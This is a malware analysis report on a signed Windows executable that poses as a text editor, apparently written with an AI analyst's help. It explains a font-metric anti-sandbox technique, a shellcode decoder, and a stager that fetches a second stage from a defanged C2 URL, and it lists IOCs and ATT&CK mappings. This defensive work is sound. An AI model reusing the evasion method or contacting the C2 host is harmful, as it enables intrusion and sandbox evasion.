# Malware Analysis Report: 14bvp.exe

**Date:** 2026-04-28  
**Analyst:** REMnux / Claude  

---

## 1. File Metadata

| Field | Value |
|-------|-------|
| Filename | `14bvp.exe` |
| SHA256 | `163cf00168d6fd28366db6c88a1216f95b10b8bb71359d161b542a67c40bffc0` |
| MD5 | `ee3ad9c019e6a0645855293f21b72990` |
| SHA1 | `d946e596fd531ba3247ad7237e039ffabd596a49` |
| Size | 290,200 bytes (283 KB) |
| Type | PE32+ executable (GUI) x86-64, for MS Windows |
| Architecture | x64 |
| Compiler | MSVC 2022 (linker v14.x) |
| Build Timestamp | 2026-04-24 13:47:41 |
| Sections | `.text`, `.rdata`, `.data`, `.pdata`, `.gxfg`, `_RDATA`, `.rsrc`, `.reloc` |
| Has Overlay | Yes (10,648 bytes — authenticode signature) |
| Has TLS Directory | Yes |

**Code Signing Certificate:**
| Field | Value |
|-------|-------|
| Issuer | GlobalSign GCC R45 EV CodeSigning CA 2020 (GlobalSign nv-sa, BE) |
| Subject | PHOTON architect design lab Limited Liability Company |
| Org / Locality | Bishkek, KG (Kyrgyzstan) |
| Email | info@softdlp.com |
| Serial | `287c387257a3bfa89a473c33` |
| Validity | 2026-04-06 → 2027-04-07 (1-year EV cert) |

---

## 2. Classification

**Verdict:** HIGH CONFIDENCE MALICIOUS  
**Type:** Text editor lure with embedded x64 shellcode stager  
**Technique signature:** Font-metric anti-sandbox + arithmetic shellcode decoder + WinInet HTTPS stager  

**Reasoning:**
- A functional W3 text editor UI (W3.Main/W3.Aux) is presented as the lure
- During UI initialization, the malware measures live font rendering metrics and uses the result as a pointer decryption key — a sophisticated anti-sandbox technique that neutralizes VM-based analysis
- A 3060-byte x64 shellcode is decoded from the `.data` section using an arithmetic (keyless) loop
- The shellcode is a full PIC stager: PEB walker → KERNEL32 → LoadLibraryA("wininet") → HTTPS connection to `mservicedge[.]com:443` → fetches stage-2 payload
- ANY.RUN sandbox scored 0/100 with no threats detected — confirming that the font-fingerprinting evasion prevented execution in the automated analysis environment

---

## 3. Capabilities

- **Font-metric anti-sandbox (T1497.001):** Calls `GetTextMetrics` / `sub_140007b90` during window creation; hashes 8 rendered font dimension values using a custom polynomial formula; stores the result as a pointer-decryption key (`0x14002a528`). VM font rendering produces different metrics → wrong key → function pointers resolve to garbage → shellcode never runs.
- **Pointer obfuscation / runtime decryption (T1027):** KERNEL32/VirtualAlloc/GetProcAddress pointers are stored in `.data` XOR-encoded with the font hash key; decrypted at runtime.
- **Arithmetic shellcode decoder (T1027.002):** 3060-byte shellcode encoded in `.data` using a counter-based arithmetic transform (no static key required). Decoded via loop in `sub_1400010b0`.
- **Anti-debug (T1622):** `IsDebuggerPresent`, `IsProcessorFeaturePresent`, `UnhandledExceptionFilter`, `RaiseException` — peframe confirmed these imports.
- **Dynamic import resolution (T1129):** Resolves all APIs at runtime via custom GetProcAddress-by-hash shellcode; avoids static import visibility.
- **PEB module walker:** PIC shellcode locates KERNEL32 via `GS:[0x60]` → PEB → Ldr → InMemoryOrderModuleList, checking module name characters `K,E,R,N,E,L,3,2`.
- **HTTPS C2 communication (T1071.001):** WinInet stack: `InternetOpenA(NULL, 1, NULL, NULL, 0)` → `InternetConnectA("mservicedge.com", 443, ...)` → `HttpOpenRequestA(...)` → `HttpSendRequestA`.
- **DLL sideloading / dynamic loading:** Loads `wininet.dll` and `shell32.dll` via `LoadLibraryA` from shellcode.
- **Code signing abuse (T1553.002):** Legitimate GlobalSign EV certificate issued to a Kyrgyz company obscures detection.
- **File I/O (T1083/T1105):** capa confirmed file read/write capabilities (UI: `doc.txt` default file, `Cannot read dropped file.`).
- **CPU fingerprinting (T1082):** `sub_140006e00` runs CPUID to detect Intel processor model and AVX/AVX-512 capabilities.
- **Shell execution (T1059):** `shell32.dll` loaded in shellcode — likely for `ShellExecuteA` to run a downloaded second-stage payload.

---

## 4. Attack Chain

```
User launches 14bvp.exe
  → Functional text editor UI opens (W3.Main / W3.Aux windows)
  → sub_1400013c0: CreateWindowExW(BUTTON3/4/5) + sub_140007b90 measures font metrics
  → Computes font hash → stored at 0x14002a528 (anti-VM key)
  → sub_1400010b0 called:
      [1] Adjusts stored pointers using font key
      [2] Dynamically resolves KERNEL32 GetProcAddress (via obfuscated thunk)
      [3] Calls VirtualAlloc(0, ~2016, ...) for shellcode buffer
      [4] Arithmetic decode loop: reads .data section bytes [EA 164054-167112]
          backward, applying counter arithmetic → 3060-byte shellcode
      [5] More pointer fixups with font key
      [6] Executes shellcode buffer via resolved function pointer
  → Shellcode (0x0000-0x0171: helpers, 0x0172+: main):
      Helper @ 0x0040: GetProcAddress by 64-bit hash (PE export walker)
      Helper @ 0x00B0: PEB KERNEL32 finder (GS:[0x60] walk)
      Main  @ 0x0172: Calls PEB finder → KERNEL32
        → LoadLibraryA("shell32") → save handle
        → LoadLibraryA("wininet") → save handle
        → Resolve WinInet API by hash (InternetOpenA, InternetConnectA, ...)
        → Stack string: "mservicedge.com\0"  [RSP+0x108]
        → Stack string: "MzzMgyLqyQaoaIx\0"  [RSP+0x310]
        → InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)
        → InternetConnectA(hInternet, "mservicedge.com", 443, NULL, NULL,
                           INTERNET_SERVICE_HTTP, 0, 0)
        → HttpOpenRequestA / HttpSendRequestA → fetch stage-2
        → ShellExecuteA (likely) to run downloaded payload
```

---

## 5. IOCs

### Network (defanged)

| Type | Value |
|------|-------|
| C2 Domain | `mservicedge[.]com` |
| C2 URL | `hxxps://mservicedge[.]com/MzzMgyLqyQaoaIx` |
| Port | 443 (HTTPS) |
| Protocol | WinInet / HTTP(S) |

### Signing

| Type | Value |
|------|-------|
| Certificate Serial | `287c387257a3bfa89a473c33` |
| Certificate Subject | PHOTON architect design lab LLC |
| Signer Email | `info@softdlp[.]com` |
| Signer Location | Bishkek, KG |

### Filesystem (from shellcode / UI)

| Type | Value |
|------|-------|
| Default file | `doc.txt` (text editor UI artefact) |

### Runtime

| Type | Value |
|------|-------|
| Libraries loaded | `wininet.dll`, `shell32.dll` |
| Anti-sandbox key | Font metric hash stored at `0x14002a528` |
| Shellcode decode source | `.data` section EA 164054–167112 (file offset 0x272E2–0x28AC8) |
| Shellcode size | 3,061 bytes |

---

## 6. Emulation Results

**Speakeasy (generic runner, pass 1):** No IOCs captured — the shellcode decode depends on live font metrics that speakeasy does not simulate. The GUI window creation path is not executed.

**Static shellcode decode (angr/manual):** Successfully decoded by reversing the arithmetic loop in `sub_1400010b0`. Output saved to `/home/remnux/mal/output/14bvp_payload.bin`.

---

## 7. Sandbox Results

**ANY.RUN:** Score **0/100** — "No threats detected"  
**Public URL:** https://app.any.run/tasks/42734bd6-1d3c-4549-8987-ad87cb916066  
**Tags:** (none)  
**Explanation:** The font-metric fingerprinting technique is working as designed. The sandbox does not render fonts with the same metrics as real hardware (or the specific metric mismatch is intentional). The pointer decryption key is therefore wrong, and the VirtualAlloc + shellcode execution branch is never reached. The sandbox sees a normal Win32 text editor application.

---

## 8. Analyst Notes

**On the anti-sandbox technique:** The font-metric fingerprinting in `sub_1400013c0` is a relatively uncommon but highly effective evasion method. The code calls `sub_140007b90(win, size)` to obtain rendered font metrics (likely a TEXTMETRIC structure), then hashes 8 values using a polynomial combining multiplication, shift, and XOR. The resulting 64-bit value is subtracted from encoded pointer values in `.data`. This technique succeeds because Windows GDI font rendering on real hardware with real display adapters (ClearType, subpixel rendering, DPI settings) produces consistently different results than the software renderers used in cloud sandboxes.

**On the certificate:** PHOTON architect design lab LLC (Bishkek, KY, `info@softdlp.com`) obtained a legitimate GlobalSign EV certificate. "softdlp.com" may suggest a legitimate software or DLP-related business, but the EV cert is being abused to sign malware. No prior samples with this cert serial were found in this session's analyzed sample set.

**Gaps / recommended follow-up:**
1. **Resolve the C2 domain:** `mservicedge[.]com` could not be resolved during ANY.RUN analysis (either domain not yet live or geofenced). Check passive DNS / VirusTotal.
2. **Recover the full stage-2:** The `/MzzMgyLqyQaoaIx` path endpoint on `mservicedge[.]com` serves the next-stage payload. Running on bare-metal hardware with traffic interception would recover it.
3. **Identify the API hashes:** The shellcode uses 64-bit API hashes (e.g., `0xB9067F9D79B4B605`, `0xB9067F89729C0098`) with an unidentified algorithm. A brute-force hash table matching against KERNEL32/wininet exports would reveal the exact functions.
4. **Font fingerprint bypass:** Patching offset `0x14002a528` to the expected value in `sub_1400013c0` (or patching the CMP that checks it) would allow sandbox execution of the shellcode.
5. **shell32 usage:** The role of `shell32.dll` in the payload (ShellExecuteA vs SHGetKnownFolderPath vs file operations) was not fully traced; additional disassembly of the shellcode from offset `0x290` onwards is recommended.
6. **Unicode strings `info` / `_far`:** Stack strings at offsets 0x375 (`info`, UTF-16LE) and 0x397 (`_far`, UTF-16LE) in the shellcode may be registry value names or Windows API function name fragments.

---

## 9. MITRE ATT&CK

| ID | Technique |
|----|-----------|
| T1027 | Obfuscated Files or Information — arithmetic-encoded shellcode in .data |
| T1027.002 | Software Packing — runtime shellcode decoder |
| T1036.001 | Masquerading: Invalid Code Signature — EV cert on malicious binary |
| T1553.002 | Code Signing — GlobalSign EV certificate abuse |
| T1055 | Process Injection — VirtualAlloc + in-process shellcode execution |
| T1106 | Native API — runtime GetProcAddress, VirtualAlloc via obfuscated indirect calls |
| T1129 | Shared Modules — dynamic LoadLibraryA of wininet, shell32 |
| T1071.001 | Application Layer Protocol: Web Protocols — HTTPS C2 via WinInet |
| T1082 | System Information Discovery — CPUID CPU model detection |
| T1083 | File and Directory Discovery — capa confirmed |
| T1497.001 | Virtualization/Sandbox Evasion: System Checks — font metric fingerprinting |
| T1622 | Debugger Evasion — IsDebuggerPresent, IsProcessorFeaturePresent |
| T1204.002 | User Execution: Malicious File — requires user to run the lure |
